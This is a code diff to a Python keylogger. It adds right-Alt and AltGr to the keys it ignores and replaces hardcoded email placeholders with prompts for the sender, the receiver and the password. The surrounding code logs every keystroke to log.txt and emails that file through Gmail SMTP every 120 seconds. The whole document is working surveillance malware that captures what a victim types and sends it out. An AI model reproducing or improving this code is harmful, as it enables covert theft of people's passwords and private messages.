@@ -38,7 +38,7 @@ def writefile(key):
                 f.write('\n')
             elif key == Key.shift:
                 pass
-            elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
+            elif key == Key.ctrl_l or key == Key.alt_r or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
                 pass
             else:
                 f.write(str(key))
@@ -51,10 +51,15 @@ def send_email_thread():
     while True:
         send_email()
         time.sleep(120)
+    
+sender_email = input("Enter sender email: ")
+
+receiver_email = input("Enter receiver email: ")
+
+password = input("Enter password: ")
 
 def send_email():
-    sender_email = "Put any email here"
-    receiver_email = "Put your email here and its App Password below"
+
     subject = "Email with Attachment"
     body = "Keystrokes in the attached log file."
     attachment_file = "log.txt"
@@ -76,7 +81,7 @@ def send_email():
 
     with smtplib.SMTP("smtp.gmail.com", 587) as server:
         server.starttls()
-        server.login(sender_email, "App Password Provided by Gmail Account(with spaces)") 
+        server.login(sender_email, password) 
         server.sendmail(sender_email, receiver_email, message.as_string())
 
     print("Email with attachment sent successfully")
